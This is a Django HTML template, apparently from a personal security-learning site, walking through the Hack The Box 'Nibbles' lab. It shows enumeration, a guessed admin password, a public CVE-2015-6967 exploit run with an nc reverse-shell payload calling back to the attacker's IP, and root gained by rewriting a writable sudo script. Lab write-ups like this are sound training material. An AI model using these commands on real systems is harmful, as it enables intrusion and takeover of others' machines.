@@ -1,0 +1,121 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB nibbles</h1>
+    <p class="text">UD : 3.5 Easy</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -sCV 10.129.104.162 --min-rate=2900</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">HTTP server is open on the target machine.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/nibbles/1-page.png' %}" alt="">
+    <img src="{% static 'EthHack/images/nibbles/2-dir.png' %}" alt="">
+</div>
+
+<p class="text">Because the page simply echo 'Hello World', we need to continue enumeration. Before use tools like gobuster, let's take a look at the inspector page, where may have interesting information.</p>
+<p class="text">The inspector page has additional information that tells us there is a directory named <u>nibbleblog</u>. It would be the hint where directory should we enumerate.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w &lt;wordlist&gt; -u http://&lt;target_ip&gt;/nibbleblog -t 70</u>
+<u class="green">SNIP...</u>
+/.hta                 (Status: 403) [Size: 304]
+/admin                (Status: 301) [Size: 327] [--> http://10.129.104.162/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/content              (Status: 301) [Size: 329] [--> http://10.129.104.162/nibbleblog/content/]
+<u class="green">...SNIP</u></code></pre></div>
+
+<p class="text">There is an admin page.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/nibbles/3-admin.png' %}" alt="">
+    <p class="text">We got new page we can step farther, there is no credentials we can use. Even though I researched 'nibbleblog default credential', there wa no interesting information. Therefore, we are required to enumerate directoreis farther.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://&lt;target_ip&gt;/nibbleblog</u>
+<u class="green">SNIP...</u>
+200      GET        2l       17w      502c http://10.129.104.162/nibbleblog/content/private/users.xml
+<u class="green">...SNIP</u></code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/nibbles/4-users.png' %}" alt="">
+    <p class="text">With enumerating there, we could find users.xml file. There is a column <u>admnin</u>, wihtout user password. Although keeped enumeration, I couldn't find addintional information. Therefore, we need to guess password with information we already have. It's common case where the password is set as HTB box title. Let's try loging in with <u>admin@nibbles</u>.</p>
+</div>
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/nibbles/5-login.png' %}" alt="">
+    <p class="text">We could login.</p>
+</div>
+
+<p class="text">Also, enumerated files with feroxbuster has one more interesting file 'nibbleblog/README', which includes nibbleblog version.</p>
+<p class="text">It says the website uses nibbleblog version 4.0.3, which has CVE-2015-6967. We can simply use existing<a href="https://github.com/hadrian3689/nibbleblog_4.0.3">POC</a>.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>git cloen https://github.com/hadrian3689/nibbleblog_4.0.3.git</u>
+└─$ <u>nc -lvnp 4444</u>
+└─$ <u>python3 nibbleblog*.py -t http://10.129.104.162/nibbleblog/admin.php -u admin -p nibbles -rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f'</u>
+
+listening on [any] 4444 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.129.104.162] 52290
+sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+</code></pre></div>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">We got nibbler user. Let's make connection stable with this code ...</p>
+<div class="code-box"><pre><code>$ script /dev/null -c /bin/bash
+Script started, file is /dev/null
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z <u class="green">#simply press ctrl+z</u>
+└─$ <u>stty raw -echo ;fg</u>
+[1]  + continued  nc -lvnp 4444
+&lt;ml/nibbleblog/content/private/plugins/my_image$ <u>reset</u>                     
+reset: unknown terminal type unknown
+Terminal type? <u>screen</u>
+
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ </code></pre></div>
+
+
+
+<p class="text">Then, let's check if the user has sudo privilege.</p>
+
+<div class="code-box"><pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -ls
+    User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre></div>
+
+<p class="text">Next, unzip the zip file in /home/nibbler, and let's check file permission of monitor.sh.</p>
+
+<div class="code-box"><pre><code><u>-rwxrwxrwx</u> 1 nibbler nibbler   10 Oct  1 23:40 monitor.sh</code></pre></div>
+<p class="text">The file is readable, writable, and executable by user nibbler. Therefore, we can simpley re-write contents of the file and get root bash.</p>
+
+
+<div class="code-box"><pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash' > monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+root@Nibbles:/home/nibbler/personal/stuff# <u class="green">#root bash</u></code></pre></div>
+
+</body>
+</html>
+
